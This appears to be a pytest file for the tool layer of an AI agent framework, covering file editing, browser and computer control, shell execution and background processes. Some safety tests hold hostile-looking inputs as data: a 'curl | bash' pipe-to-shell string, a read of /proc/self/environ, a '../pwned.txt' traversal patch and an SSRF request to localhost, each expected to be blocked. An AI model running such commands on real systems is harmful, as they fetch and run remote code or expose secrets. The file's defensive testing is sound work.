"""Built-in and extended tools."""

from __future__ import annotations


def _ctx(tmp_path):
    from aegis.config import Config
    from aegis.tools.base import ToolContext
    return ToolContext(cwd=tmp_path, config=Config.load())


def test_read_write_edit(tmp_path):
    from aegis.tools.builtin import EditFileTool, ReadFileTool, WriteFileTool
    ctx = _ctx(tmp_path)
    assert not WriteFileTool().run({"path": "a.txt", "content": "one\ntwo"}, ctx).is_error
    r = ReadFileTool().run({"path": "a.txt"}, ctx)
    assert "one" in r.content and "two" in r.content
    EditFileTool().run({"path": "a.txt", "old_string": "two", "new_string": "2"}, ctx)
    assert (tmp_path / "a.txt").read_text().endswith("2")


def test_read_file_blocks_devices_binary_and_oversized_results(tmp_path):
    from aegis.config import Config
    from aegis.tools.base import ToolContext
    from aegis.tools.builtin import ReadFileTool
    from aegis.tools.file_safety import is_blocked_read_path

    tool = ReadFileTool()
    ctx = ToolContext(cwd=tmp_path, config=Config.load())
    assert tool.run({"path": "/dev/zero"}, ctx).is_error
    assert is_blocked_read_path("/proc/self/environ")

    binary = tmp_path / "bin.dat"
    binary.write_bytes(b"abc\x00def")
    assert "binary file" in tool.run({"path": "bin.dat"}, ctx).content

    big = tmp_path / "big.txt"
    big.write_text("x" * 80)
    ctx.config.data["tools"]["file_read_max_chars"] = 40
    res = tool.run({"path": "big.txt"}, ctx)
    assert res.is_error and "safety limit" in res.content and "offset and limit" in res.content


def test_file_tools_preserve_bom_mode_and_crlf(tmp_path, monkeypatch):
    import os
    import stat

    from aegis.tools.builtin import EditFileTool, WriteFileTool

    bom = "\ufeff".encode("utf-8")
    target = tmp_path / "bom.txt"
    target.write_bytes(bom + b"old\r\n")
    os.chmod(target, 0o640)

    ctx = _ctx(tmp_path)
    assert not WriteFileTool().run({"path": "bom.txt", "content": "new\n"}, ctx).is_error
    assert target.read_bytes() == bom + b"new\r\n"
    assert stat.S_IMODE(target.stat().st_mode) == 0o640

    assert not EditFileTool().run(
        {"path": "bom.txt", "old_string": "new\n", "new_string": "next\nline\n"},
        ctx,
    ).is_error
    assert target.read_bytes() == bom + b"next\r\nline\r\n"

    original = target.read_bytes()

    def fail_replace(*_args, **_kwargs):
        raise OSError("replace failed")

    monkeypatch.setattr("aegis.tools.builtin.os.replace", fail_replace)
    failed = WriteFileTool().run({"path": "bom.txt", "content": "corrupt"}, ctx)
    assert failed.is_error
    assert target.read_bytes() == original


def test_write_file_safe_root_and_sensitive_system_paths(tmp_path, monkeypatch):
    from aegis.tools.builtin import WriteFileTool
    from aegis.tools.file_safety import is_sensitive

    safe = tmp_path / "workspace"
    outside = tmp_path / "workspace-evil" / "x.txt"
    monkeypatch.setenv("AEGIS_WRITE_SAFE_ROOT", str(safe))

    ctx = _ctx(tmp_path)
    inside = WriteFileTool().run({"path": str(safe / "ok.txt"), "content": "ok"}, ctx)
    blocked = WriteFileTool().run({"path": str(outside), "content": "no"}, ctx)

    assert not inside.is_error
    assert blocked.is_error and "write safe root" in blocked.content
    assert not outside.exists()
    assert is_sensitive("/private/etc/hosts")
    assert not is_sensitive("/private/var/folders/aegis-test/file.txt")
    assert is_sensitive("/private/var/db/aegis-test/file.txt")
    assert is_sensitive("/run/docker.sock")


def test_browser_navigate_blocks_ssrf_before_launch(tmp_path, monkeypatch):
    from aegis.tools.base import ToolContext
    from aegis.tools.browser import BrowserTool

    tool = BrowserTool()

    def should_not_launch(_ctx):
        raise AssertionError("browser launched before SSRF guard")

    monkeypatch.setattr(tool, "_ensure", should_not_launch)
    res = tool.run({"action": "navigate", "url": "http://127.0.0.1/admin"}, ToolContext(cwd=tmp_path))

    assert res.is_error
    assert "blocked for safety" in res.content


def test_browser_navigate_blocks_private_final_url_after_redirect(tmp_path):
    from aegis.tools.base import ToolContext
    from aegis.tools.browser import BrowserTool

    tool = BrowserTool()
    calls = []

    class FakePage:
        url = "http://127.0.0.1/admin"

        def goto(self, url, **_kwargs):
            calls.append(url)
            if url == "about:blank":
                self.url = "about:blank"

        def title(self):
            return "private"

    def ensure(_ctx):
        tool._page = FakePage()

    tool._ensure = ensure
    res = tool.run({"action": "navigate", "url": "https://example.com/start"}, ToolContext(cwd=tmp_path))

    assert res.is_error
    assert "blocked final browser URL after redirect" in res.content
    assert calls == ["https://example.com/start", "about:blank"]


def test_browser_and_computer_screenshots_respect_write_safe_root(tmp_path, monkeypatch):
    import sys
    from types import SimpleNamespace

    from aegis.tools.base import ToolContext
    from aegis.tools.browser import BrowserTool, ComputerTool

    monkeypatch.setenv("AEGIS_WRITE_SAFE_ROOT", str(tmp_path / "safe"))
    ctx = ToolContext(cwd=tmp_path)

    browser = BrowserTool()
    called = {"browser": False, "computer": False}

    class FakePage:
        def screenshot(self, **_kwargs):
            called["browser"] = True

    def ensure(tool_ctx):
        browser._page = FakePage()

    monkeypatch.setattr(browser, "_ensure", ensure)
    res = browser.run({"action": "screenshot", "path": str(tmp_path / "outside" / "shot.png")}, ctx)
    assert res.is_error and "write safe root" in res.content
    assert called["browser"] is False

    fake_pyautogui = SimpleNamespace(
        screenshot=lambda _path: called.__setitem__("computer", True),
        typewrite=lambda *_args, **_kwargs: None,
    )
    monkeypatch.setitem(sys.modules, "pyautogui", fake_pyautogui)
    res = ComputerTool().run(
        {"action": "screenshot", "path": str(tmp_path / "outside" / "screen.png")},
        ctx,
    )
    assert res.is_error and "write safe root" in res.content
    assert called["computer"] is False


def test_computer_type_guard_is_case_insensitive(tmp_path, monkeypatch):
    import sys
    from types import SimpleNamespace

    from aegis.tools.browser import ComputerTool

    fake_pyautogui = SimpleNamespace(typewrite=lambda *_args, **_kwargs: None)
    monkeypatch.setitem(sys.modules, "pyautogui", fake_pyautogui)
    res = ComputerTool().run({"action": "type", "text": "CURL https://x | BASH"}, _ctx(tmp_path))

    assert res.is_error
    assert "dangerous payload" in res.content


def test_edit_ambiguous_requires_replace_all(tmp_path):
    from aegis.tools.builtin import EditFileTool, WriteFileTool
    ctx = _ctx(tmp_path)
    WriteFileTool().run({"path": "b.txt", "content": "x x x"}, ctx)
    assert EditFileTool().run({"path": "b.txt", "old_string": "x", "new_string": "y"}, ctx).is_error
    assert not EditFileTool().run(
        {"path": "b.txt", "old_string": "x", "new_string": "y", "replace_all": True}, ctx).is_error


def test_list_glob_search(tmp_path):
    from aegis.tools.builtin import GlobTool, ListDirTool, SearchTool, WriteFileTool
    ctx = _ctx(tmp_path)
    WriteFileTool().run({"path": "src/main.py", "content": "def hello(): pass"}, ctx)
    assert "src" in ListDirTool().run({"path": "."}, ctx).content
    assert "main.py" in GlobTool().run({"pattern": "**/*.py"}, ctx).content
    assert "hello" in SearchTool().run({"pattern": "def hello"}, ctx).content


def test_todo_tool(tmp_path):
    from aegis.session import Session
    from aegis.tools.base import ToolContext
    from aegis.tools.builtin import TodoWriteTool
    from aegis.config import Config
    s = Session.create()
    ctx = ToolContext(cwd=tmp_path, config=Config.load(), session=s)
    TodoWriteTool().run({"todos": [{"content": "a", "status": "completed"},
                                   {"content": "b", "status": "pending"}]}, ctx)
    assert len(s.todos) == 2


def test_apply_patch(tmp_path):
    import shutil
    if not shutil.which("git"):
        return
    from aegis.tools.extra_builtin import ApplyPatchTool
    f = tmp_path / "h.txt"
    f.write_text("a\nb\nc\n")
    patch = "--- a/h.txt\n+++ b/h.txt\n@@ -1,3 +1,3 @@\n a\n-b\n+B\n c\n"
    assert not ApplyPatchTool().run({"patch": patch}, _ctx(tmp_path)).is_error
    assert "B" in f.read_text()


def test_apply_patch_respects_safe_root(tmp_path, monkeypatch):
    from aegis.tools.extra_builtin import ApplyPatchTool

    safe = tmp_path / "safe"
    monkeypatch.setenv("AEGIS_WRITE_SAFE_ROOT", str(safe))
    patch = "--- /dev/null\n+++ b/outside.txt\n@@ -0,0 +1 @@\n+no\n"

    res = ApplyPatchTool().run({"patch": patch}, _ctx(tmp_path))

    assert res.is_error
    assert "write safe root" in res.content
    assert not (tmp_path / "outside.txt").exists()


def test_apply_patch_blocks_traversal(tmp_path):
    from aegis.tools.extra_builtin import ApplyPatchTool

    patch = "--- /dev/null\n+++ b/../pwned.txt\n@@ -0,0 +1 @@\n+no\n"

    res = ApplyPatchTool().run({"patch": patch}, _ctx(tmp_path))

    assert res.is_error
    assert "traversal" in res.content
    assert not (tmp_path.parent / "pwned.txt").exists()


def test_apply_patch_reports_and_refreshes_stale_state(tmp_path):
    import shutil
    import time

    if not shutil.which("git"):
        return

    from aegis.tools import file_state
    from aegis.tools.extra_builtin import ApplyPatchTool

    file_state.reset()
    f = tmp_path / "h.txt"
    f.write_text("a\nb\nc\n")
    file_state.note(f)
    time.sleep(0.01)
    f.write_text("a\nb\nc\n")

    patch = "--- a/h.txt\n+++ b/h.txt\n@@ -1,3 +1,3 @@\n a\n-b\n+B\n c\n"
    res = ApplyPatchTool().run({"patch": patch}, _ctx(tmp_path))

    assert not res.is_error, res.content
    assert "changed on disk" in res.content
    assert file_state.stale_warning(f) == ""


def test_schedule_task_tool(tmp_path):
    from aegis.tools.extra_builtin import ScheduleTaskTool
    from aegis.cron import CronStore
    res = ScheduleTaskTool().run({"schedule": "30m", "prompt": "check"}, _ctx(tmp_path))
    assert not res.is_error
    assert len(CronStore().list()) == 1


def test_schedule_task_defaults_to_current_channel(tmp_path):
    from aegis.config import Config
    from aegis.cron import CronStore
    from aegis.tools.base import ToolContext
    from aegis.tools.extra_builtin import ScheduleTaskTool

    agent = type("Agent", (), {"platform": "telegram", "chat_id": "42"})()
    ctx = ToolContext(cwd=tmp_path, config=Config.load(), agent=agent)
    res = ScheduleTaskTool().run({"schedule": "30m", "prompt": "check"}, ctx)

    assert not res.is_error
    job = CronStore().list()[0]
    assert job.deliver == "telegram:42"
    assert "telegram:42" in res.content


def test_bash_tool_runs(tmp_path):
    from aegis.tools.builtin import BashTool
    res = BashTool().run({"command": "echo hello-bash"}, _ctx(tmp_path))
    assert "hello-bash" in res.content and not res.is_error


def test_bash_tool_rejects_non_string_command(tmp_path):
    from aegis.tools.builtin import BashTool

    res = BashTool().run({"command": None}, _ctx(tmp_path))

    assert res.is_error
    assert "expected string" in res.content
    assert "NoneType" in res.content


def test_compound_background_rewrite_matches_aegis_regression():
    from aegis.tools.command_utils import rewrite_compound_background as rewrite

    assert rewrite("A && B &") == "A && { B & }"
    assert rewrite("A || B &") == "A || { B & }"
    assert rewrite("A && B && C &") == "A && B && { C & }"
    assert rewrite("sleep 5 &") == "sleep 5 &"
    assert rewrite("A && B; C &") == "A && B; C &"
    assert rewrite("A && B | C &") == "A && B | C &"
    assert rewrite("echo 'A && B &'") == "echo 'A && B &'"
    assert rewrite("A && B &>/dev/null &") == "A && { B &>/dev/null & }"
    once = rewrite("cd /tmp && server &\nsleep 1")
    assert rewrite(once) == once


def test_bash_tool_persists_local_shell_state_by_task(tmp_path):
    from aegis.tools.backends import cleanup_task_environment
    from aegis.tools.builtin import BashTool

    tool = BashTool()
    task_id = f"test_{tmp_path.name}"
    other_task_id = f"{task_id}_other"
    ctx = _ctx(tmp_path)
    ctx.task_id = task_id
    other = _ctx(tmp_path)
    other.task_id = other_task_id
    try:
        first = tool.run(
            {"command": "mkdir -p inner && cd inner && export AEGIS_TEST_PERSIST=ok"},
            ctx,
        )
        assert not first.is_error

        second = tool.run(
            {"command": 'printf "%s|%s" "$AEGIS_TEST_PERSIST" "$(pwd -P)"'},
            ctx,
        )
        assert not second.is_error
        assert f"ok|{tmp_path / 'inner'}" in second.content

        isolated = tool.run(
            {"command": 'printf "%s|%s" "${AEGIS_TEST_PERSIST-unset}" "$(pwd -P)"'},
            other,
        )
        assert not isolated.is_error
        assert f"unset|{tmp_path}" in isolated.content
    finally:
        cleanup_task_environment(task_id)
        cleanup_task_environment(other_task_id)


def test_local_environment_cache_is_scoped_to_aegis_home(tmp_path, monkeypatch):
    from aegis.config import Config
    from aegis.tools import backends

    task_id = "same_task_different_home"
    home_one = tmp_path / "home-one"
    home_two = tmp_path / "home-two"
    try:
        monkeypatch.setenv("AEGIS_HOME", str(home_one))
        out_one, code_one = backends.run_command(
            "echo first-home",
            str(tmp_path),
            10,
            "local",
            Config.load(),
            task_id=task_id,
        )
        env_one = backends.get_active_environment(task_id)

        monkeypatch.setenv("AEGIS_HOME", str(home_two))
        out_two, code_two = backends.run_command(
            "echo second-home",
            str(tmp_path),
            10,
            "local",
            Config.load(),
            task_id=task_id,
        )
        env_two = backends.get_active_environment(task_id)

        assert code_one == 0 and "first-home" in out_one
        assert code_two == 0 and "second-home" in out_two
        assert env_one is not None and env_two is not None
        assert env_two is not env_one
    finally:
        backends.cleanup_task_environment(task_id)


def test_bash_tool_explains_outer_bwrap_loopback_failure(tmp_path, monkeypatch):
    import aegis.tools.backends as backends
    from aegis.tools.builtin import BashTool

    class FakeEnvironment:
        def execute(self, *_a, **_k):
            return {
                "output": "bwrap: loopback: Failed RTM_NEWADDR: Operation not permitted\n",
                "returncode": 1,
            }

    monkeypatch.setattr(
        backends,
        "_get_or_create_local_environment",
        lambda *_a, **_k: FakeEnvironment(),
    )
    res = BashTool().run({"command": "pwd"}, _ctx(tmp_path))

    assert res.is_error
    assert "bubblewrap wrapper failed before the command ran" in res.content
    assert "Subagents can still spawn" in res.content
    assert "[exit 126]" in res.content


def test_bash_tool_background_uses_process_registry(tmp_path):
    from types import SimpleNamespace

    from aegis.session import Session
    from aegis.tools.builtin import BashTool
    from aegis.tools.process_registry import process_registry

    ctx = _ctx(tmp_path)
    ctx.task_id = "bash_bg_task"
    ctx.session = Session(id="gateway:room:u1", title="gateway")
    ctx.agent = SimpleNamespace(
        platform="telegram",
        chat_id="room",
        user_id="u1",
        user_name="alien",
        thread_id="topic",
        message_id="msg1",
    )
    res = BashTool().run(
        {
            "command": 'printf "task:%s\\n" "$AEGIS_TASK_ID"',
            "background": True,
        },
        ctx,
    )
    sid = res.data["session_id"]
    try:
        assert not res.is_error
        assert f"session_id: {sid}" in res.content
        session = process_registry.get(sid)
        assert session is not None
        assert session.session_key == "gateway:room:u1"
        assert session.watcher_platform == "telegram"
        assert session.watcher_chat_id == "room"
        assert session.watcher_user_id == "u1"
        assert session.watcher_user_name == "alien"
        assert session.watcher_thread_id == "topic"
        assert session.watcher_message_id == "msg1"
        waited = process_registry.wait(sid, timeout=5)
        assert waited["status"] == "exited"
        log = process_registry.read_log(sid)
        assert "task:bash_bg_task" in log["output"]
    finally:
        process_registry.kill_process(sid)
        process_registry._finished.pop(sid, None)


def test_bash_tool_background_watch_pattern_queues_wakeup(tmp_path):
    import time

    from aegis.agent import wakeups
    from aegis.tools.builtin import BashTool
    from aegis.tools.process_registry import process_registry

    wakeups.drain_wakeups()
    process_registry.drain_notifications()
    ctx = _ctx(tmp_path)
    ctx.task_id = "bash_watch_task"
    res = BashTool().run(
        {
            "command": "printf 'boot\\nREADY\\n'; sleep 0.2",
            "background": True,
            "watch_patterns": ["READY"],
        },
        ctx,
    )
    sid = res.data["session_id"]
    try:
        assert not res.is_error
        assert res.data["notify_on_complete"] is False
        assert res.data["watch_patterns"] == ["READY"]
        events = []
        notes = []
        for _ in range(50):
            events.extend(process_registry.drain_notifications())
            notes = wakeups.drain_wakeups()
            if events and notes:
                break
            time.sleep(0.1)
        assert events
        event, text = events[0]
        assert event["type"] == "watch_match"
        assert event["pattern"] == "READY"
        assert "READY" in text
        assert notes and notes[0]["source"] == "process"
        assert "READY" in notes[0]["text"] or "READY" in notes[0]["title"]
    finally:
        process_registry.kill_process(sid)
        process_registry._finished.pop(sid, None)


def test_bash_tool_background_pty_uses_pty_reader(tmp_path, monkeypatch):
    import time

    from aegis.agent import wakeups
    from aegis.tools import process_registry as registry_mod
    from aegis.tools.builtin import BashTool
    from aegis.tools.process_registry import process_registry

    class FakePty:
        pid = 43210
        exitstatus = 0

        def __init__(self):
            self._alive = True

        def isalive(self):
            return self._alive

        def read(self, _size):
            self._alive = False
            return "PTY READY\n"

        def wait(self):
            return self.exitstatus

        def terminate(self, force=False):
            self._alive = False
            self.exitstatus = -15

        def write(self, _data):
            return None

        def sendeof(self):
            return None

    monkeypatch.setattr(registry_mod, "_spawn_pty_process", lambda *_a, **_k: FakePty())
    wakeups.drain_wakeups()
    process_registry.drain_notifications()
    res = BashTool().run(
        {
            "command": "python -i",
            "background": True,
            "pty": True,
            "watch_patterns": ["READY"],
        },
        _ctx(tmp_path),
    )
    sid = res.data["session_id"]
    try:
        assert not res.is_error
        assert res.data["pty"] is True
        events = []
        for _ in range(50):
            events.extend(process_registry.drain_notifications())
            if events:
                break
            time.sleep(0.1)
        assert events and events[0][0]["type"] == "watch_match"
        assert "PTY READY" in process_registry.read_log(sid)["output"]
    finally:
        process_registry.kill_process(sid)
        process_registry._running.pop(sid, None)
        process_registry._finished.pop(sid, None)


def test_bash_tool_background_pty_falls_back_to_pipes(tmp_path, monkeypatch):
    from aegis.tools import process_registry as registry_mod
    from aegis.tools.builtin import BashTool
    from aegis.tools.process_registry import process_registry

    def no_pty(*_args, **_kwargs):
        raise ImportError("no pty")

    monkeypatch.setattr(registry_mod, "_spawn_pty_process", no_pty)
    res = BashTool().run(
        {
            "command": "echo pipe-fallback",
            "background": True,
            "pty": True,
            "notify_on_complete": False,
        },
        _ctx(tmp_path),
    )
    sid = res.data["session_id"]
    try:
        assert not res.is_error
        assert "ptyprocess is not installed" in res.data["pty_fallback"]
        waited = process_registry.wait(sid, timeout=5)
        assert waited["status"] == "exited"
        assert "pipe-fallback" in waited["output"]
    finally:
        process_registry.kill_process(sid)
        process_registry._finished.pop(sid, None)


def test_process_registry_env_background_polls_log_and_exit(tmp_path, monkeypatch):
    from aegis.tools import process_registry as registry_mod
    from aegis.tools.process_registry import process_registry

    class FakeEnv:
        cwd = str(tmp_path)

        def __init__(self):
            self.log_reads = 0
            self.exit_code = None

        def get_temp_dir(self):
            return "/tmp"

        def execute(self, command, cwd="", timeout=None):
            if "bash -lc" in command and ".pid" in command and ".exit" in command:
                return {"output": "4242\n", "returncode": 0}
            if command.startswith("cat ") and ".log" in command:
                self.log_reads += 1
                if self.log_reads >= 2:
                    self.exit_code = 0
                    return {"output": "boot\nREADY\n", "returncode": 0}
                return {"output": "boot\n", "returncode": 0}
            if "echo exited" in command:
                if self.exit_code is None:
                    return {"output": "running\n", "returncode": 0}
                return {"output": f"exited\n{self.exit_code}\n", "returncode": 0}
            return {"output": "", "returncode": 0}

    monkeypatch.setattr(registry_mod, "ENV_POLL_INTERVAL_SECONDS", 0.01)
    process_registry.drain_notifications()
    session = process_registry.spawn_via_env(
        FakeEnv(),
        "printf READY",
        cwd=str(tmp_path),
        task_id="env_bg_task",
        watch_patterns=["READY"],
    )
    try:
        assert session.pid == 4242
        waited = process_registry.wait(session.id, timeout=5)
        assert waited["status"] == "exited"
        assert waited["exit_code"] == 0
        assert "READY" in waited["output"]
        events = process_registry.drain_notifications()
        assert events and events[0][0]["type"] == "watch_match"
    finally:
        process_registry.kill_process(session.id)
        process_registry._running.pop(session.id, None)
        process_registry._finished.pop(session.id, None)


def test_process_registry_env_background_kills_process_group(tmp_path, monkeypatch):
    from aegis.tools import process_registry as registry_mod
    from aegis.tools.process_registry import process_registry

    class FakeEnv:
        cwd = str(tmp_path)

        def __init__(self):
            self.commands = []

        def get_temp_dir(self):
            return "/tmp"

        def execute(self, command, cwd="", timeout=None):
            self.commands.append(command)
            if "bash -lc" in command and ".pid" in command and ".exit" in command:
                return {"output": "4242\n", "returncode": 0}
            return {"output": "", "returncode": 0}

    fake = FakeEnv()
    monkeypatch.setattr(registry_mod, "ENV_POLL_INTERVAL_SECONDS", 10)
    session = process_registry.spawn_via_env(
        fake,
        "sleep 999",
        cwd=str(tmp_path),
        task_id="env_kill_task",
    )
    try:
        result = process_registry.kill_process(session.id)

        assert result["status"] == "killed"
        kill_commands = [cmd for cmd in fake.commands if "kill -TERM" in cmd]
        assert kill_commands
        assert 'kill -TERM -"$pid"' in kill_commands[-1]
        assert 'kill -TERM "$pid"' in kill_commands[-1]
    finally:
        process_registry._running.pop(session.id, None)
        process_registry._finished.pop(session.id, None)


def test_bash_tool_background_uses_nonlocal_env_backend(tmp_path, monkeypatch):
    from types import SimpleNamespace

    from aegis.config import Config
    from aegis.tools import backends
    from aegis.tools.base import ToolContext
    from aegis.tools.builtin import BashTool
    from aegis.tools.process_registry import process_registry

    config = Config.load()
    config.data["tools"]["terminal_backend"] = "ssh"
    seen = {}
    fake_env = object()

    def fake_create_environment(backend, cwd, timeout, config, task_id=None):
        seen["create"] = (backend, cwd, timeout, task_id)
        return fake_env, "", "ssh"

    def fake_spawn(env, command, **kwargs):
        seen["spawn"] = (env, command, kwargs)
        return SimpleNamespace(
            id="proc_env",
            pid=4242,
            exited=False,
            pty=False,
            pty_fallback="",
        )

    monkeypatch.setattr(backends, "create_environment", fake_create_environment)
    monkeypatch.setattr(process_registry, "spawn_via_env", fake_spawn)
    ctx = ToolContext(cwd=tmp_path, config=config)
    ctx.task_id = "nonlocal_task"

    res = BashTool().run({"command": "sleep 60", "background": True}, ctx)

    assert not res.is_error
    assert res.data["backend"] == "ssh"
    assert seen["create"] == ("ssh", str(tmp_path), 120, "nonlocal_task")
    assert seen["spawn"][0] is fake_env
    assert seen["spawn"][1] == "sleep 60"
    assert seen["spawn"][2]["task_id"] == "nonlocal_task"


def test_process_tool_start_uses_nonlocal_env_backend(tmp_path, monkeypatch):
    from types import SimpleNamespace

    from aegis.config import Config
    from aegis.tools import backends
    from aegis.tools.base import ToolContext
    from aegis.tools.process import ProcessTool
    from aegis.tools.process_registry import process_registry

    config = Config.load()
    config.data["tools"]["terminal_backend"] = "ssh"
    seen = {}
    fake_env = object()

    def fake_create_environment(backend, cwd, timeout, config, task_id=None):
        seen["create"] = (backend, cwd, timeout, task_id)
        return fake_env, "", "ssh"

    def fake_spawn(env, command, **kwargs):
        seen["spawn"] = (env, command, kwargs)
        return SimpleNamespace(
            id="proc_env",
            pid=4242,
            exited=False,
            pty=False,
            pty_fallback="",
        )

    monkeypatch.setattr(backends, "create_environment", fake_create_environment)
    monkeypatch.setattr(process_registry, "spawn_via_env", fake_spawn)
    ctx = ToolContext(cwd=tmp_path, config=config)
    ctx.task_id = "proc_nonlocal_task"

    res = ProcessTool().run({"action": "start", "command": "sleep 60"}, ctx)

    assert not res.is_error
    assert res.data["backend"] == "ssh"
    assert seen["create"] == ("ssh", str(tmp_path), 120, "proc_nonlocal_task")
    assert seen["spawn"][0] is fake_env
    assert seen["spawn"][1] == "sleep 60"
    assert seen["spawn"][2]["task_id"] == "proc_nonlocal_task"


def test_bash_tool_background_rejects_unavailable_nonlocal_backend(tmp_path, monkeypatch):
    from aegis.config import Config
    from aegis.tools import backends
    from aegis.tools.base import ToolContext
    from aegis.tools.builtin import BashTool

    config = Config.load()
    config.data.setdefault("tools", {})["terminal_backend"] = "ssh"
    ctx = ToolContext(cwd=tmp_path, config=config)
    monkeypatch.setattr(
        backends,
        "create_environment",
        lambda *_args, **_kwargs: (None, "sandbox unavailable: ssh not configured", "ssh"),
    )

    res = BashTool().run({"command": "echo hi", "background": True}, ctx)

    assert res.is_error
    assert "ssh not configured" in res.content


def test_docker_environment_injects_task_id(tmp_path, monkeypatch):
    import io

    import aegis.tools.environments.docker as docker_env
    from aegis.tools.environments.docker import DockerEnvironment

    calls = {"run": [], "popen": []}
    created = {"value": False}

    class Proc:
        def __init__(self, stdout="", stderr="", returncode=0):
            self.stdout = stdout
            self.stderr = stderr
            self.returncode = returncode

    def fake_run(argv, **_kwargs):
        calls["run"].append(argv)
        if argv[:2] == ["docker", "inspect"]:
            return Proc("true\n" if created["value"] else "", returncode=0 if created["value"] else 1)
        if argv[:2] == ["docker", "run"]:
            created["value"] = True
            return Proc("container-id\n", returncode=0)
        return Proc(returncode=0)

    class FakePopen:
        def __init__(self, argv, **_kwargs):
            calls["popen"].append(argv)
            self.stdout = io.BytesIO(b"ok\n")
            self.returncode = 0

        def poll(self):
            return self.returncode

        def wait(self, timeout=None):
            return self.returncode

        def kill(self):
            self.returncode = -9

    monkeypatch.setattr(docker_env.subprocess, "run", fake_run)
    monkeypatch.setattr(docker_env.subprocess, "Popen", FakePopen)

    env = DockerEnvironment(
        image="python:3.12-slim",
        cwd=str(tmp_path),
        timeout=10,
        task_id="sub_test",
    )
    result = env.execute("echo hi")
    env.cleanup()

    assert "ok" in result["output"]
    assert result["returncode"] == 0
    docker_run = next(argv for argv in calls["run"] if argv[:2] == ["docker", "run"])
    assert "-d" in docker_run and "--name" in docker_run
    container_name = docker_run[docker_run.index("--name") + 1]
    assert "AEGIS_TASK_ID=sub_test" in docker_run
    assert calls["popen"]
    assert all("exec" in argv for argv in calls["popen"])
    assert all("AEGIS_TASK_ID=sub_test" in argv for argv in calls["popen"])
    assert ["docker", "rm", "-f", container_name] in calls["run"]


def test_daytona_backend_fails_closed(tmp_path):
    from aegis.config import Config
    from aegis.tools.backends import run_command

    out, code = run_command("echo hi", str(tmp_path), 10, "daytona", Config.load())

    assert code == 126
    assert "daytona backend is not configured" in out


def test_process_tool_submit_and_wait(tmp_path):
    from aegis.session import Session
    from aegis.tools.base import ToolContext
    from aegis.tools.process import ProcessTool
    from aegis.tools.process_registry import process_registry

    ctx = ToolContext(cwd=tmp_path)
    ctx.task_id = "proc_submit_task"
    ctx.session = Session(id="terminal:proc-session", title="terminal")
    tool = ProcessTool()
    start = tool.run({"action": "start", "command": "read line; echo got:$line"}, ctx)
    sid = start.data["session_id"]
    try:
        session = process_registry.get(sid)
        assert session is not None
        assert session.session_key == "terminal:proc-session"
        submit = tool.run({"action": "submit", "session_id": sid, "data": "hello"}, ctx)
        assert not submit.is_error
        waited = tool.run({"action": "wait", "session_id": sid, "timeout": 5}, ctx)
        assert not waited.is_error
        logs = tool.run({"action": "log", "session_id": sid}, ctx)
        assert "got:hello" in logs.content
        assert process_registry.list_sessions(task_id="proc_submit_task")
    finally:
        process_registry.kill_process(sid)
        process_registry._finished.pop(sid, None)


def test_process_tool_rejects_non_string_start_command(tmp_path):
    from aegis.tools.process import ProcessTool

    res = ProcessTool().run({"action": "start", "command": None}, _ctx(tmp_path))

    assert res.is_error
    assert "expected string" in res.content


def test_process_registry_cleans_ansi_and_shell_noise(tmp_path):
    import time

    from aegis.tools.process_registry import ProcessRegistry, ProcessSession

    registry = ProcessRegistry()
    sid = "proc_clean"
    session = ProcessSession(
        id=sid,
        command="fake",
        cwd=str(tmp_path),
        started_at=time.time(),
        exited=True,
        exit_code=0,
        output_buffer=(
            "bash: cannot set terminal process group (123): Inappropriate ioctl for device\n"
            "\x1b[31mREADY\x1b[0m\n"
        ),
        notify_on_complete=True,
    )
    try:
        registry._finished[sid] = session
        registry._queue_completion(session)
        event, _text = registry.drain_notifications()[0]
        poll = registry.poll(sid)
        log = registry.read_log(sid)
        waited = registry.wait(sid, timeout=1)

        for output in (poll["output_preview"], log["output"], waited["output"], event["output"]):
            assert "READY" in output
            assert "\x1b" not in output
            assert "cannot set terminal process group" not in output
    finally:
        registry._finished.pop(sid, None)


def test_process_registry_recovers_running_checkpoint(tmp_path, monkeypatch):
    from aegis.tools.process_registry import ProcessRegistry

    home = tmp_path / "home"
    monkeypatch.setenv("AEGIS_HOME", str(home))
    registry = ProcessRegistry()
    session = registry.spawn_local(
        "sleep 5",
        cwd=tmp_path,
        task_id="recover_task",
        watch_patterns=["READY"],
    )
    try:
        recovered = ProcessRegistry()
        poll = recovered.poll(session.id)
        assert poll["status"] == "running"
        assert poll["detached"] is True
        assert poll["watch_patterns"] == ["READY"]
        assert recovered.has_active_processes("recover_task")
    finally:
        registry.kill_process(session.id)
        ProcessRegistry().kill_process(session.id)


def test_process_registry_recovers_pending_completion_notification(tmp_path, monkeypatch):
    import json
    import time

    from aegis.tools.process_registry import ProcessRegistry

    home = tmp_path / "home"
    monkeypatch.setenv("AEGIS_HOME", str(home))
    home.mkdir()
    (home / "processes.json").write_text(
        json.dumps({
            "running": [],
            "finished": [{
                "id": "proc_done",
                "command": "echo done",
                "task_id": "recover_notify_task",
                "session_key": "telegram:c1:u1",
                "cwd": str(tmp_path),
                "started_at": time.time(),
                "exited": True,
                "exit_code": 0,
                "output_buffer": "done\n",
                "notify_on_complete": True,
                "watcher_platform": "telegram",
                "watcher_chat_id": "c1",
                "watcher_user_id": "u1",
                "watcher_user_name": "alien",
                "watcher_thread_id": "topic",
                "watcher_message_id": "msg1",
            }],
        }),
        encoding="utf-8",
    )

    recovered = ProcessRegistry()
    events = recovered.drain_notifications()

    assert len(events) == 1
    event, text = events[0]
    assert event["type"] == "completion"
    assert event["session_key"] == "telegram:c1:u1"
    assert event["platform"] == "telegram"
    assert "Background process proc_done completed" in text
    assert ProcessRegistry().drain_notifications() == []


def test_process_registry_drain_detects_recovered_process_exit(tmp_path, monkeypatch):
    import json
    import time

    from aegis.tools import process_registry as registry_mod
    from aegis.tools.process_registry import ProcessRegistry

    home = tmp_path / "home"
    monkeypatch.setenv("AEGIS_HOME", str(home))
    home.mkdir()
    alive = {"value": True}
    monkeypatch.setattr(registry_mod, "_pid_alive", lambda _pid: alive["value"])
    (home / "processes.json").write_text(
        json.dumps({
            "running": [{
                "id": "proc_later_done",
                "command": "sleep 1",
                "task_id": "recover_running_notify_task",
                "session_key": "telegram:c1:u1",
                "pid": 4242,
                "pid_scope": "host",
                "cwd": str(tmp_path),
                "started_at": time.time(),
                "exited": False,
                "notify_on_complete": True,
                "watcher_platform": "telegram",
                "watcher_chat_id": "c1",
                "watcher_user_id": "u1",
            }],
            "finished": [],
        }),
        encoding="utf-8",
    )

    recovered = ProcessRegistry()
    alive["value"] = False
    events = recovered.drain_notifications()

    assert len(events) == 1
    event, text = events[0]
    assert event["type"] == "completion"
    assert event["session_id"] == "proc_later_done"
